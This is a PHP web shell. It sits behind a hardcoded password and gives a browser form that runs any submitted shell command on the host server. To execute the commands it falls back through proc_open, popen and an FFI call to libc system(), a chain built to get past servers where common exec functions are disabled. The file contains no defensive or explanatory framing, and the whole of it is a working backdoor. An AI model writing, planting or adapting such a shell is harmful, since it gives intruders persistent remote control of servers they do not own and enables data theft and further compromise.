<?php
session_start();
$password = "jaihindict"; // CHANGE THIS

// Logout handler
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Login form
if (!isset($_SESSION['auth'])) {
    if ($_SERVER["REQUEST_METHOD"] === "POST" && $_POST['pwd'] === $password) {
        $_SESSION['auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    ?>
    <form method="POST">
        <h2>Enter Password</h2>
        <input type="password" name="pwd" required>
        <input type="submit" value="Login">
    </form>
    <?php
    exit;
}

echo "<h3>Welcome! <a href='?logout=1'>Logout</a></h3>";

function execute_command($cmd) {
    // 1. Try proc_open
    if (function_exists("proc_open")) {
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($process);
            return "[proc_open] " . $output;
        }
    }

    // 2. Try popen
    if (function_exists("popen")) {
        $handle = popen($cmd . " 2>&1", "r");
        $output = stream_get_contents($handle);
        pclose($handle);
        return "[popen] " . $output;
    }

    // 3. Try FFI
    if (class_exists("FFI")) {
        try {
            $ffi = FFI::cdef("int system(const char *cmd);");
            ob_start();
            $ffi->system($cmd);
            $output = ob_get_clean();
            return "[FFI] " . $output;
        } catch (Throwable $e) {
            return "[FFI] Error: " . $e->getMessage();
        }
    }

    return "All methods failed or are disabled.";
}

// Handle submitted command
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    echo "<h4>Command Output:</h4><pre>" . htmlspecialchars(execute_command($command)) . "</pre>";
}
?>

<form method="POST">
    <input type="text" name="cmd" placeholder="Enter command" required style="width:300px;">
    <input type="submit" value="Run">
</form>
